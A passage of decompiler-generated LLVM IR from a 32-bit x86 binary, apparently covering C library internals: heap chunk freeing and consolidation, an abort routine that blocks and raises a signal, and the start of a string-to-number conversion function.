  %v1_8054318 = add i32 %arg1, -4
  %v2_8054318 = inttoptr i32 %v1_8054318 to i32*
  %v3_8054318 = load i32, i32* %v2_8054318, align 4
  %v1_805431d = and i32 %v3_8054318, -4
  %v4_805431d = trunc i32 %v1_805431d to i8
  store i32 %v1_805431d, i32* @ebx, align 4
  %v8_8054322 = icmp ugt i8 %v4_805431d, %v0_8054310
  br i1 %v8_8054322, label %dec_label_pc_8054344, label %dec_label_pc_8054324

dec_label_pc_8054324:                             ; preds = %dec_label_pc_80542ec
  %v2_8054324 = udiv i32 %v3_8054318, 8
  %v1_8054327 = or i32 %v1_8054310, 3
  %v3_8054327 = trunc i32 %v1_8054327 to i8
  store i32 %v1_8054327, i32* %eax.global-to-local, align 4
  store i8 %v3_8054327, i8* @global_var_8057540.206, align 64
  %v1_805432f = mul nuw i32 %v2_8054324, 4
  %v2_805432f = add i32 %v1_805432f, ptrtoint (i8* @global_var_8057540.206 to i32)
  store i32 %v2_805432f, i32* @edx, align 4
  %v1_8054336 = add i32 %v1_805432f, add (i32 ptrtoint (i8* @global_var_8057540.206 to i32), i32 -4)
  %v2_8054336 = inttoptr i32 %v1_8054336 to i32*
  %v3_8054336 = load i32, i32* %v2_8054336, align 4
  store i32 %v3_8054336, i32* %eax.global-to-local, align 4
  %v3_8054339 = inttoptr i32 %arg1 to i32*
  store i32 %v3_8054336, i32* %v3_8054339, align 4
  %v0_805433c = load i32, i32* @ecx, align 4
  %v1_805433c = load i32, i32* @edx, align 4
  %v2_805433c = add i32 %v1_805433c, -4
  %v3_805433c = inttoptr i32 %v2_805433c to i32*
  store i32 %v0_805433c, i32* %v3_805433c, align 4
  br label %dec_label_pc_805445c

dec_label_pc_8054344:                             ; preds = %dec_label_pc_80542ec
  %v1_8054344 = trunc i32 %v3_8054318 to i8
  %v2_8054344 = and i8 %v1_8054344, 2
  %v3_8054344 = icmp eq i8 %v2_8054344, 0
  %v5_8054344 = zext i8 %v2_8054344 to i32
  %v7_8054344 = and i32 %v3_8054318, -256
  %v8_8054344 = or i32 %v5_8054344, %v7_8054344
  store i32 %v8_8054344, i32* @edx, align 4
  %v1_8054347 = icmp eq i1 %v3_8054344, false
  br i1 %v1_8054347, label %dec_label_pc_805443c, label %dec_label_pc_805434d

dec_label_pc_805434d:                             ; preds = %dec_label_pc_8054344
  %v1_805434d = or i32 %v1_8054310, 1
  %v3_805434d = trunc i32 %v1_805434d to i8
  store i32 %v1_805434d, i32* %eax.global-to-local, align 4
  %v2_8054350 = add i32 %v1_805431d, %v1_805430d
  store i32 %v2_8054350, i32* @esi, align 4
  store i8 %v3_805434d, i8* @global_var_8057540.206, align 64
  %v1_8054358 = add i32 %v2_8054350, 4
  %v2_8054358 = inttoptr i32 %v1_8054358 to i32*
  %v3_8054358 = load i32, i32* %v2_8054358, align 4
  store i32 %v3_8054358, i32* %eax.global-to-local, align 4
  %v2_805435f = inttoptr i32 %v1_8054318 to i8*
  %v3_805435f = load i8, i8* %v2_805435f, align 1
  %v4_805435f = urem i8 %v3_805435f, 2
  %v5_805435f = icmp eq i8 %v4_805435f, 0
  %v1_8054363 = icmp eq i1 %v5_805435f, false
  br i1 %v1_8054363, label %dec_label_pc_8054386, label %dec_label_pc_8054365

dec_label_pc_8054365:                             ; preds = %dec_label_pc_805434d
  %v2_8054365 = inttoptr i32 %v1_805430d to i32*
  %v3_8054365 = load i32, i32* %v2_8054365, align 4
  store i32 %v3_8054365, i32* @ebp, align 4
  %v2_805436a = sub i32 %v1_805430d, %v3_8054365
  store i32 %v2_805436a, i32* %eax.global-to-local, align 4
  %v1_805436c = add i32 %v2_805436a, 8
  %v2_805436c = inttoptr i32 %v1_805436c to i32*
  %v3_805436c = load i32, i32* %v2_805436c, align 4
  store i32 %v3_805436c, i32* @edi, align 4
  %v1_805436f = add i32 %v2_805436a, 12
  %v2_805436f = inttoptr i32 %v1_805436f to i32*
  %v3_805436f = load i32, i32* %v2_805436f, align 4
  store i32 %v3_805436f, i32* @edx, align 4
  %v1_8054372 = add i32 %v3_805436c, 12
  %v2_8054372 = inttoptr i32 %v1_8054372 to i32*
  %v3_8054372 = load i32, i32* %v2_8054372, align 4
  store i32 %v3_8054372, i32* @ecx, align 4
  %v12_8054375 = icmp eq i32 %v3_8054372, %v2_805436a
  %v1_8054377 = icmp eq i1 %v12_8054375, false
  br i1 %v1_8054377, label %dec_label_pc_80543b5, label %dec_label_pc_8054379

dec_label_pc_8054379:                             ; preds = %dec_label_pc_8054365
  %v1_8054379 = add i32 %v3_805436f, 8
  %v2_8054379 = inttoptr i32 %v1_8054379 to i32*
  %v3_8054379 = load i32, i32* %v2_8054379, align 4
  %v15_8054379 = icmp eq i32 %v3_8054379, %v3_8054372
  %v1_805437c = icmp eq i1 %v15_8054379, false
  br i1 %v1_805437c, label %dec_label_pc_80543b5, label %dec_label_pc_805437e

dec_label_pc_805437e:                             ; preds = %dec_label_pc_8054379
  %v2_805437e = add i32 %v3_8054365, %v1_805431d
  store i32 %v2_805437e, i32* @ebx, align 4
  store i32 %v3_805436f, i32* %v2_8054372, align 4
  %v0_8054383 = load i32, i32* @edi, align 4
  %v1_8054383 = load i32, i32* @edx, align 4
  %v2_8054383 = add i32 %v1_8054383, 8
  %v3_8054383 = inttoptr i32 %v2_8054383 to i32*
  store i32 %v0_8054383, i32* %v3_8054383, align 4
  %v0_805438d.pre = load i32, i32* @esi, align 4
  br label %dec_label_pc_8054386

dec_label_pc_8054386:                             ; preds = %dec_label_pc_805434d, %dec_label_pc_805437e
  %v1_8054399 = phi i32 [ %v2_8054350, %dec_label_pc_805434d ], [ %v0_805438d.pre, %dec_label_pc_805437e ]
  %v1_805438a = and i32 %v3_8054358, -4
  store i32 %v1_805438a, i32* @ebp, align 4
  %v1_805438d = load i32, i32* @global_var_805756c.207, align 4
  %v12_805438d = icmp eq i32 %v1_8054399, %v1_805438d
  br i1 %v12_805438d, label %dec_label_pc_80543e7, label %dec_label_pc_8054395

dec_label_pc_8054395:                             ; preds = %dec_label_pc_8054386
  %v2_8054395 = add i32 %v1_8054399, 4
  %v3_8054395 = add i32 %v2_8054395, %v1_805438a
  %v4_8054395 = inttoptr i32 %v3_8054395 to i32*
  %v5_8054395 = load i32, i32* %v4_8054395, align 4
  store i32 %v5_8054395, i32* %eax.global-to-local, align 4
  %v3_8054399 = inttoptr i32 %v2_8054395 to i32*
  store i32 %v1_805438a, i32* %v3_8054399, align 4
  %v0_805439c = load i32, i32* %eax.global-to-local, align 4
  %v1_805439c = urem i32 %v0_805439c, 2
  %v2_805439c = icmp eq i32 %v1_805439c, 0
  store i32 %v1_805439c, i32* %eax.global-to-local, align 4
  %v1_80543a1 = icmp eq i1 %v2_805439c, false
  br i1 %v1_80543a1, label %dec_label_pc_80543c2, label %dec_label_pc_80543a3

dec_label_pc_80543a3:                             ; preds = %dec_label_pc_8054395
  %v0_80543a3 = load i32, i32* @esi, align 4
  %v1_80543a3 = add i32 %v0_80543a3, 8
  %v2_80543a3 = inttoptr i32 %v1_80543a3 to i32*
  %v3_80543a3 = load i32, i32* %v2_80543a3, align 4
  store i32 %v3_80543a3, i32* @edx, align 4
  %v1_80543a6 = add i32 %v0_80543a3, 12
  %v2_80543a6 = inttoptr i32 %v1_80543a6 to i32*
  %v3_80543a6 = load i32, i32* %v2_80543a6, align 4
  store i32 %v3_80543a6, i32* %eax.global-to-local, align 4
  %v1_80543a9 = add i32 %v3_80543a3, 12
  %v2_80543a9 = inttoptr i32 %v1_80543a9 to i32*
  %v3_80543a9 = load i32, i32* %v2_80543a9, align 4
  store i32 %v3_80543a9, i32* @edi, align 4
  %v12_80543ac = icmp eq i32 %v3_80543a9, %v0_80543a3
  %v1_80543ae = icmp eq i1 %v12_80543ac, false
  br i1 %v1_80543ae, label %dec_label_pc_80543b5, label %dec_label_pc_80543b0

dec_label_pc_80543b0:                             ; preds = %dec_label_pc_80543a3
  %v1_80543b0 = add i32 %v3_80543a6, 8
  %v2_80543b0 = inttoptr i32 %v1_80543b0 to i32*
  %v3_80543b0 = load i32, i32* %v2_80543b0, align 4
  %v15_80543b0 = icmp eq i32 %v3_80543b0, %v3_80543a9
  br i1 %v15_80543b0, label %dec_label_pc_80543ba, label %dec_label_pc_80543b5

dec_label_pc_80543b5:                             ; preds = %dec_label_pc_80543b0, %dec_label_pc_80543a3, %dec_label_pc_8054379, %dec_label_pc_8054365
  %v0_80543b5 = call i32 @function_8054475()
  store i32 %v0_80543b5, i32* %eax.global-to-local, align 4
  %v1_80543ba.pre = load i32, i32* @edx, align 4
  br label %dec_label_pc_80543ba

dec_label_pc_80543ba:                             ; preds = %dec_label_pc_80543b0, %dec_label_pc_80543b5
  %v1_80543ba = phi i32 [ %v3_80543a3, %dec_label_pc_80543b0 ], [ %v1_80543ba.pre, %dec_label_pc_80543b5 ]
  %v0_80543ba = phi i32 [ %v3_80543a6, %dec_label_pc_80543b0 ], [ %v0_80543b5, %dec_label_pc_80543b5 ]
  %v2_80543ba = add i32 %v1_80543ba, 12
  %v3_80543ba = inttoptr i32 %v2_80543ba to i32*
  store i32 %v0_80543ba, i32* %v3_80543ba, align 4
  %v0_80543bd = load i32, i32* @edx, align 4
  %v1_80543bd = load i32, i32* %eax.global-to-local, align 4
  %v2_80543bd = add i32 %v1_80543bd, 8
  %v3_80543bd = inttoptr i32 %v2_80543bd to i32*
  store i32 %v0_80543bd, i32* %v3_80543bd, align 4
  %v0_80543c0 = load i32, i32* @ebx, align 4
  %v1_80543c0 = load i32, i32* @ebp, align 4
  %v2_80543c0 = add i32 %v1_80543c0, %v0_80543c0
  store i32 %v2_80543c0, i32* @ebx, align 4
  br label %dec_label_pc_80543c2

dec_label_pc_80543c2:                             ; preds = %dec_label_pc_8054395, %dec_label_pc_80543ba
  %v0_80543c2 = load i32, i32* @global_var_805757c.225, align 4
  store i32 %v0_80543c2, i32* %eax.global-to-local, align 4
  %v0_80543c7 = load i32, i32* @ecx, align 4
  %v1_80543c7 = add i32 %v0_80543c7, 12
  %v2_80543c7 = inttoptr i32 %v1_80543c7 to i32*
  store i32 ptrtoint (i32* @global_var_8057574.209 to i32), i32* %v2_80543c7, align 4
  %v0_80543ce = load i32, i32* %eax.global-to-local, align 4
  %v1_80543ce = load i32, i32* @ecx, align 4
  %v2_80543ce = add i32 %v1_80543ce, 8
  %v3_80543ce = inttoptr i32 %v2_80543ce to i32*
  store i32 %v0_80543ce, i32* %v3_80543ce, align 4
  %v0_80543d1 = load i32, i32* @ebx, align 4
  %v1_80543d1 = load i32, i32* @ecx, align 4
  %v3_80543d1 = add i32 %v1_80543d1, %v0_80543d1
  %v4_80543d1 = inttoptr i32 %v3_80543d1 to i32*
  store i32 %v0_80543d1, i32* %v4_80543d1, align 4
  %v0_80543d4 = load i32, i32* @ecx, align 4
  %v1_80543d4 = load i32, i32* %eax.global-to-local, align 4
  %v2_80543d4 = add i32 %v1_80543d4, 12
  %v3_80543d4 = inttoptr i32 %v2_80543d4 to i32*
  store i32 %v0_80543d4, i32* %v3_80543d4, align 4
  %v0_80543d7 = load i32, i32* @ebx, align 4
  %v1_80543d9 = or i32 %v0_80543d7, 1
  store i32 %v1_80543d9, i32* %eax.global-to-local, align 4
  %v0_80543dc = load i32, i32* @ecx, align 4
  store i32 %v0_80543dc, i32* @global_var_805757c.225, align 4
  %v2_80543e2 = add i32 %v0_80543dc, 4
  %v3_80543e2 = inttoptr i32 %v2_80543e2 to i32*
  store i32 %v1_80543d9, i32* %v3_80543e2, align 4
  br label %dec_label_pc_80543f7

dec_label_pc_80543e7:                             ; preds = %dec_label_pc_8054386
  %v0_80543e7 = load i32, i32* @ebx, align 4
  %v2_80543e7 = add i32 %v0_80543e7, %v1_805438a
  store i32 %v2_80543e7, i32* @ebx, align 4
  %v1_80543eb = or i32 %v2_80543e7, 1
  store i32 %v1_80543eb, i32* %eax.global-to-local, align 4
  %v1_80543ee = load i32, i32* @ecx, align 4
  %v2_80543ee = add i32 %v1_80543ee, 4
  %v3_80543ee = inttoptr i32 %v2_80543ee to i32*
  store i32 %v1_80543eb, i32* %v3_80543ee, align 4
  %v0_80543f1 = load i32, i32* @ecx, align 4
  store i32 %v0_80543f1, i32* @global_var_805756c.207, align 4
  br label %dec_label_pc_80543f7

dec_label_pc_80543f7:                             ; preds = %dec_label_pc_80543c2, %dec_label_pc_80543e7
  %v0_80543f7 = load i32, i32* @ebx, align 4
  %tmp21 = icmp ult i32 %v0_80543f7, 131072
  br i1 %tmp21, label %dec_label_pc_805445c, label %dec_label_pc_80543ff

dec_label_pc_80543ff:                             ; preds = %dec_label_pc_80543f7
  %v0_80543ff = load i8, i8* @global_var_8057540.206, align 64
  %v1_80543ff = and i8 %v0_80543ff, 2
  %v2_80543ff = icmp eq i8 %v1_80543ff, 0
  br i1 %v2_80543ff, label %dec_label_pc_8054418, label %dec_label_pc_8054408

dec_label_pc_8054408:                             ; preds = %dec_label_pc_80543ff
  %v2_8054410 = call i32 @function_8054131(i32* bitcast (i8* @global_var_8057540.206 to i32*))
  store i32 %v2_8054410, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_8054418

dec_label_pc_8054418:                             ; preds = %dec_label_pc_80543ff, %dec_label_pc_8054408
  %v0_8054418 = load i32, i32* @global_var_805756c.207, align 4
  store i32 %v0_8054418, i32* %eax.global-to-local, align 4
  %v1_805441d = add i32 %v0_8054418, 4
  %v2_805441d = inttoptr i32 %v1_805441d to i32*
  %v3_805441d = load i32, i32* %v2_805441d, align 4
  %v1_8054420 = and i32 %v3_805441d, -4
  store i32 %v1_8054420, i32* %eax.global-to-local, align 4
  %v1_8054423 = load i32, i32* @global_var_8057884.223, align 4
  %v7_8054423 = icmp ult i32 %v1_8054420, %v1_8054423
  br i1 %v7_8054423, label %dec_label_pc_805445c, label %dec_label_pc_805442b

dec_label_pc_805442b:                             ; preds = %dec_label_pc_8054418
  store i32 ptrtoint (i8* @global_var_8057540.206 to i32), i32* @edx, align 4
  %v0_8054430 = load i32, i32* @global_var_8057888.221, align 8
  store i32 %v0_8054430, i32* @eax, align 4
  %v0_8054435 = call i32 @function_80540a4()
  store i32 %v0_8054435, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_805445c

dec_label_pc_805443c:                             ; preds = %dec_label_pc_8054344
  %v2_805443c = inttoptr i32 %v1_805430d to i32*
  %v3_805443c = load i32, i32* %v2_805443c, align 4
  %v0_805443f = load i32, i32* @global_var_8057890.214, align 16
  %v1_805443f = add i32 %v0_805443f, -1
  store i32 %v1_805443f, i32* @global_var_8057890.214, align 16
  %v2_8054445 = add i32 %v3_805443c, %v1_805431d
  store i32 %v2_8054445, i32* %eax.global-to-local, align 4
  %v2_8054448 = sub i32 %v1_805430d, %v3_805443c
  %v0_805444e = load i32, i32* @global_var_80578a4.217, align 4
  %v2_805444e = sub i32 %v0_805444e, %v2_8054445
  store i32 %v2_805444e, i32* @global_var_80578a4.217, align 4
  %v4_8054454 = inttoptr i32 %v2_8054448 to i32*
  %v5_8054454 = call i32 @function_80551a5(i32* %v4_8054454, i32 %v2_8054445, i32 %v1_805431d, i32 %v1_805431d)
  store i32 %v5_8054454, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_805445c

dec_label_pc_805445c:                             ; preds = %dec_label_pc_8054418, %dec_label_pc_80543f7, %dec_label_pc_805442b, %dec_label_pc_8054324, %dec_label_pc_805443c
  store i32 %v2_80542f7, i32* @eax, align 4
  %v2_8054465 = call i32 @function_8054a40(i32 %v2_80542f7, i32 1)
  store i32 %v2_8054465, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_805446d

dec_label_pc_805446d:                             ; preds = %dec_label_pc_80542d9, %dec_label_pc_805445c
  %.0 = phi i32 [ undef, %dec_label_pc_80542d9 ], [ %v2_8054465, %dec_label_pc_805445c ]
  store i32 %v0_80542dc, i32* @ebx, align 4
  store i32 %v0_80542db, i32* @esi, align 4
  store i32 %v0_80542da, i32* @edi, align 4
  store i32 %v0_80542d9, i32* @ebp, align 4
  ret i32 %.0

; uselistorder directives
  uselistorder i32 %v3_805443c, { 1, 0 }
  uselistorder i32 %v0_80543d1, { 1, 0 }
  uselistorder i32 %v1_805439c, { 1, 0 }
  uselistorder i32 %v2_8054395, { 1, 0 }
  uselistorder i32 %v1_805438a, { 0, 2, 1, 3 }
  uselistorder i32 %v1_8054399, { 1, 0 }
  uselistorder i32 %v1_805431d, { 3, 4, 0, 1, 2, 5, 6 }
  uselistorder i32 %v3_8054318, { 1, 2, 0, 3 }
  uselistorder i32 %v1_805430d, { 1, 4, 2, 3, 0, 5 }
  uselistorder i32* %eax.global-to-local, { 0, 1, 2, 5, 3, 4, 6, 7, 8, 9, 10, 11, 14, 15, 12, 13, 16, 17, 18, 19, 20, 21, 22, 23, 24 }
  uselistorder i32* bitcast (i8* @global_var_8057540.206 to i32*), { 0, 2, 1, 3 }
  uselistorder i32 ptrtoint (i32* @global_var_8057574.209 to i32), { 1, 2, 3, 4, 5, 6, 7, 0, 8 }
  uselistorder i32* @global_var_805756c.207, { 1, 2, 3, 4, 5, 6, 7, 8, 0, 9, 10, 11 }
  uselistorder i32 ptrtoint (i8* @global_var_8057540.206 to i32), { 7, 6, 0, 5, 4, 1, 3, 2 }
  uselistorder i8* @global_var_8057540.206, { 4, 7, 6, 5, 3, 0, 2, 1 }
  uselistorder i32 ptrtoint (i32* @global_var_80571a0.205 to i32), { 0, 1, 4, 2, 3, 5 }
  uselistorder i32 %arg1, { 1, 0, 4, 3, 2 }
  uselistorder label %dec_label_pc_805446d, { 1, 0 }
  uselistorder label %dec_label_pc_805445c, { 4, 2, 0, 1, 3 }
  uselistorder label %dec_label_pc_8054418, { 1, 0 }
  uselistorder label %dec_label_pc_80543f7, { 1, 0 }
  uselistorder label %dec_label_pc_80543c2, { 1, 0 }
  uselistorder label %dec_label_pc_80543ba, { 1, 0 }
  uselistorder label %dec_label_pc_8054386, { 1, 0 }
}

define i32 @function_8054475() local_unnamed_addr {
dec_label_pc_8054490.lr.ph:
  %eax.global-to-local = alloca i32, align 4
  %stack_var_-272 = alloca i32, align 4
  %stack_var_-132 = alloca i32, align 4
  %stack_var_-284 = alloca i32, align 4
  %v1_8054481 = call i32 @function_8054a3d(i32 ptrtoint (i32* @global_var_80571b8.226 to i32))
  %v12_805448b = ptrtoint i32* %stack_var_-284 to i32
  store i32 31, i32* %eax.global-to-local, align 4
  %v4_805449048 = add i32 %v12_805448b, 276
  %v5_805449049 = inttoptr i32 %v4_805449048 to i32*
  store i32 0, i32* %v5_805449049, align 4
  %v0_805449b50 = load i32, i32* %eax.global-to-local, align 4
  %v1_805449b51 = add i32 %v0_805449b50, -1
  %v9_805449b52 = icmp slt i32 %v1_805449b51, 0
  store i32 %v1_805449b51, i32* %eax.global-to-local, align 4
  %v1_805449c53 = icmp eq i1 %v9_805449b52, false
  br i1 %v1_805449c53, label %dec_label_pc_8054490.dec_label_pc_8054490_crit_edge, label %dec_label_pc_805449e

dec_label_pc_8054490.dec_label_pc_8054490_crit_edge: ; preds = %dec_label_pc_8054490.lr.ph, %dec_label_pc_8054490.dec_label_pc_8054490_crit_edge
  %v1_805449b54 = phi i32 [ %v1_805449b, %dec_label_pc_8054490.dec_label_pc_8054490_crit_edge ], [ %v1_805449b51, %dec_label_pc_8054490.lr.ph ]
  %v0_8054490.pre = load i32, i32* @esp, align 4
  %v2_8054490 = mul i32 %v1_805449b54, 4
  %v3_8054490 = add i32 %v0_8054490.pre, 152
  %v4_8054490 = add i32 %v3_8054490, %v2_8054490
  %v5_8054490 = inttoptr i32 %v4_8054490 to i32*
  store i32 0, i32* %v5_8054490, align 4
  %v0_805449b = load i32, i32* %eax.global-to-local, align 4
  %v1_805449b = add i32 %v0_805449b, -1
  %v9_805449b = icmp slt i32 %v1_805449b, 0
  store i32 %v1_805449b, i32* %eax.global-to-local, align 4
  %v1_805449c = icmp eq i1 %v9_805449b, false
  br i1 %v1_805449c, label %dec_label_pc_8054490.dec_label_pc_8054490_crit_edge, label %dec_label_pc_805449e

dec_label_pc_805449e:                             ; preds = %dec_label_pc_8054490.dec_label_pc_8054490_crit_edge, %dec_label_pc_8054490.lr.ph
  %v0_805449e = load i32, i32* @ebx, align 4
  %v2_80544a2 = ptrtoint i32* %stack_var_-132 to i32
  store i32 %v2_80544a2, i32* @ebx, align 4
  %v4_80544aa = call i32 @function_80534ce(i32 %v2_80544a2, i32 6, i32 %v0_805449e, i32 %v0_805449e)
  store i32 %v4_80544aa, i32* %eax.global-to-local, align 4
  %v1_80544b2 = icmp eq i32 %v4_80544aa, 0
  %v1_80544b4 = icmp eq i1 %v1_80544b2, false
  br i1 %v1_80544b4, label %dec_label_pc_80544c4, label %dec_label_pc_80544b6

dec_label_pc_80544b6:                             ; preds = %dec_label_pc_805449e
  %v3_80544bc = bitcast i32* %stack_var_-132 to %_TYPEDEF_sigset_t*
  %v4_80544bc = call i32 @function_8052ded(i32 1, %_TYPEDEF_sigset_t* %v3_80544bc, i32 0)
  store i32 %v4_80544bc, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_80544c4

dec_label_pc_80544c4:                             ; preds = %dec_label_pc_805449e, %dec_label_pc_80544b6
  %v2_80544fc23 = phi i32 [ %v4_80544aa, %dec_label_pc_805449e ], [ %v4_80544bc, %dec_label_pc_80544b6 ]
  %v0_80544c4 = load i8, i8* @global_var_80572b4.227, align 4
  %v1_80544c4 = icmp eq i8 %v0_80544c4, 0
  %v1_80544cb = icmp eq i1 %v1_80544c4, false
  br i1 %v1_80544cb, label %dec_label_pc_80544fc, label %dec_label_pc_80544cd

dec_label_pc_80544cd:                             ; preds = %dec_label_pc_80544c4
  store i8 1, i8* @global_var_80572b4.227, align 4
  br label %dec_label_pc_80544d4

dec_label_pc_80544d4:                             ; preds = %dec_label_pc_805453b, %dec_label_pc_80544cd
  %v1_80544dc = call i32 @function_8054a3d(i32 ptrtoint (i32* @global_var_80571b8.226 to i32))
  store i32 %v1_80544dc, i32* %eax.global-to-local, align 4
  %v1_80544e8 = call i32 @function_80533a0(i32 6)
  store i32 %v1_80544e8, i32* %eax.global-to-local, align 4
  %v1_80544f4 = call i32 @function_8054a3d(i32 ptrtoint (i32* @global_var_80571b8.226 to i32))
  store i32 %v1_80544f4, i32* %eax.global-to-local, align 4
  %v0_80544fc.pre = load i8, i8* @global_var_80572b4.227, align 4
  br label %dec_label_pc_80544fc

dec_label_pc_80544fc:                             ; preds = %dec_label_pc_80544c4, %dec_label_pc_80544d4
  %v2_80544fc = phi i32 [ %v2_80544fc23, %dec_label_pc_80544c4 ], [ %v1_80544f4, %dec_label_pc_80544d4 ]
  %v0_80544fc = phi i8 [ %v0_80544c4, %dec_label_pc_80544c4 ], [ %v0_80544fc.pre, %dec_label_pc_80544d4 ]
  %v1_80544fc = zext i8 %v0_80544fc to i32
  %v3_80544fc = and i32 %v2_80544fc, -256
  %v4_80544fc = or i32 %v1_80544fc, %v3_80544fc
  store i32 %v4_80544fc, i32* %eax.global-to-local, align 4
  %v10_8054501 = icmp eq i8 %v0_80544fc, 1
  %v1_8054503 = icmp eq i1 %v10_8054501, false
  br i1 %v1_8054503, label %dec_label_pc_805455d, label %dec_label_pc_8054530.lr.ph

dec_label_pc_8054530.lr.ph:                       ; preds = %dec_label_pc_80544fc
  store i8 2, i8* @global_var_80572b4.227, align 4
  %v2_8054514 = ptrtoint i32* %stack_var_-272 to i32
  store i32 %v2_8054514, i32* %eax.global-to-local, align 4
  %v3_8054519 = bitcast i32* %stack_var_-272 to i8*
  %v4_8054519 = call i32 @function_805310a(i8* %v3_8054519, i32 0, i32 140)
  store i32 0, i32* %stack_var_-272, align 4
  store i32 31, i32* %eax.global-to-local, align 4
  %v4_805453040 = add i32 %v12_805448b, 140
  %v5_805453041 = inttoptr i32 %v4_805453040 to i32*
  store i32 -1, i32* %v5_805453041, align 4
  %v0_805453842 = load i32, i32* %eax.global-to-local, align 4
  %v1_805453843 = add i32 %v0_805453842, -1
  %v9_805453844 = icmp slt i32 %v1_805453843, 0
  store i32 %v1_805453843, i32* %eax.global-to-local, align 4
  %v1_805453945 = icmp eq i1 %v9_805453844, false
  br i1 %v1_805453945, label %dec_label_pc_8054530.dec_label_pc_8054530_crit_edge, label %dec_label_pc_805453b

dec_label_pc_8054530.dec_label_pc_8054530_crit_edge: ; preds = %dec_label_pc_8054530.lr.ph, %dec_label_pc_8054530.dec_label_pc_8054530_crit_edge
  %v1_805453846 = phi i32 [ %v1_8054538, %dec_label_pc_8054530.dec_label_pc_8054530_crit_edge ], [ %v1_805453843, %dec_label_pc_8054530.lr.ph ]
  %v0_8054530.pre = load i32, i32* @esp, align 4
  %v2_8054530 = mul i32 %v1_805453846, 4
  %v3_8054530 = add i32 %v0_8054530.pre, 16
  %v4_8054530 = add i32 %v3_8054530, %v2_8054530
  %v5_8054530 = inttoptr i32 %v4_8054530 to i32*
  store i32 -1, i32* %v5_8054530, align 4
  %v0_8054538 = load i32, i32* %eax.global-to-local, align 4
  %v1_8054538 = add i32 %v0_8054538, -1
  %v9_8054538 = icmp slt i32 %v1_8054538, 0
  store i32 %v1_8054538, i32* %eax.global-to-local, align 4
  %v1_8054539 = icmp eq i1 %v9_8054538, false
  br i1 %v1_8054539, label %dec_label_pc_8054530.dec_label_pc_8054530_crit_edge, label %dec_label_pc_805453b

dec_label_pc_805453b:                             ; preds = %dec_label_pc_8054530.dec_label_pc_8054530_crit_edge, %dec_label_pc_8054530.lr.ph
  store i32 %v2_8054514, i32* %eax.global-to-local, align 4
  %v4_8054550 = call i32 @function_8054c7f(i32 6, i32* nonnull %stack_var_-272, i32 0)
  store i32 %v4_8054550, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_80544d4

dec_label_pc_805455d:                             ; preds = %dec_label_pc_80544fc
  %v10_805455d = icmp eq i8 %v0_80544fc, 2
  %v1_805455f = icmp eq i1 %v10_805455d, false
  br i1 %v1_805455f, label %dec_label_pc_8054569, label %dec_label_pc_8054569.thread

dec_label_pc_8054569.thread:                      ; preds = %dec_label_pc_805455d
  store i8 3, i8* @global_var_80572b4.227, align 4
  br label %dec_label_pc_8054572

dec_label_pc_8054569:                             ; preds = %dec_label_pc_805455d
  %v9_8054569 = icmp eq i8 %v0_80544fc, 3
  %v1_8054570 = icmp eq i1 %v9_8054569, false
  br i1 %v1_8054570, label %dec_label_pc_8054583, label %dec_label_pc_8054572

dec_label_pc_8054572:                             ; preds = %dec_label_pc_8054569.thread, %dec_label_pc_8054569
  store i8 4, i8* @global_var_80572b4.227, align 4
  %v1_805457e = call i32 @function_8054de0(i32 127)
  unreachable

dec_label_pc_8054583:                             ; preds = %dec_label_pc_8054569, %dec_label_pc_8054583
  br label %dec_label_pc_8054583

; uselistorder directives
  uselistorder i32 %v1_8054538, { 2, 1, 0 }
  uselistorder i32 %v1_805449b, { 2, 1, 0 }
  uselistorder i32* %stack_var_-272, { 0, 2, 1, 3 }
  uselistorder i32* %eax.global-to-local, { 0, 1, 2, 15, 16, 11, 12, 3, 4, 5, 6, 7, 8, 9, 10, 17, 18, 13, 14 }
  uselistorder i8 3, { 0, 4, 1, 2, 3 }
  uselistorder i8 2, { 8, 11, 12, 1, 13, 2, 3, 4, 5, 6, 14, 15, 7, 0, 10, 16, 9 }
  uselistorder i8* @global_var_80572b4.227, { 5, 4, 3, 0, 2, 1 }
  uselistorder label %dec_label_pc_8054583, { 1, 0 }
  uselistorder label %dec_label_pc_8054572, { 1, 0 }
  uselistorder label %dec_label_pc_8054530.dec_label_pc_8054530_crit_edge, { 1, 0 }
  uselistorder label %dec_label_pc_80544fc, { 1, 0 }
  uselistorder label %dec_label_pc_80544c4, { 1, 0 }
  uselistorder label %dec_label_pc_8054490.dec_label_pc_8054490_crit_edge, { 1, 0 }
}

define i32 @function_8054586() local_unnamed_addr {
dec_label_pc_8054586:
  %tmp = call i32 @__decompiler_undefined_function_0()
  %v3_8054591 = call i32 @function_805459a(i32 %tmp, i32 0, i32 10)
  ret i32 %v3_8054591
}

define i32 @function_805459a(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
dec_label_pc_805459a:
  %v4_80545ab = inttoptr i32 %arg1 to i8*
  %v5_80545ab = call i32 @function_80545b4(i8* %v4_80545ab, i32 %arg2, i32 %arg3, i32 1)
  ret i32 %v5_80545ab
}

define i32 @function_80545b4(i8* %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
dec_label_pc_80545b4:
  %eax.global-to-local = alloca i32, align 4
  %ebp.global-to-local = alloca i32, align 4
  %ebx.global-to-local = alloca i32, align 4
  %edx.global-to-local = alloca i32, align 4
  %esi.global-to-local = alloca i32, align 4
  %tmp = trunc i32 %arg4 to i8
  %tmp41 = call i32 @__decompiler_undefined_function_0()
  %stack_var_-16 = alloca i32, align 4
  %v0_80545b7 = load i32, i32* @ebx, align 4
  store i32 %v0_80545b7, i32* %stack_var_-16, align 4
  %v0_80545bb = load i32, i32* bitcast (i32** @global_var_80571ec.229 to i32*), align 4
  store i32 %v0_80545bb, i32* %edx.global-to-local, align 4
  %v4_80545c1 = ptrtoint i8* %arg1 to i32
  store i32 %arg3, i32* %esi.global-to-local, align 4
  store i32 %v4_80545c1, i32* %ebx.global-to-local, align 4
  %v2_80545ce7 = load i8, i8* %arg1, align 1
  %v3_80545ce8 = sext i8 %v2_80545ce7 to i32
  store i32 %v3_80545ce8, i32* %eax.global-to-local, align 4
  %v2_80545d110 = mul nsw i32 %v3_80545ce8, 2
  %v3_80545d111 = add i32 %v2_80545d110, %v0_80545bb
  %v4_80545d112 = inttoptr i32 %v3_80545d111 to i8*
  %v5_80545d113 = load i8, i8* %v4_80545d112, align 1
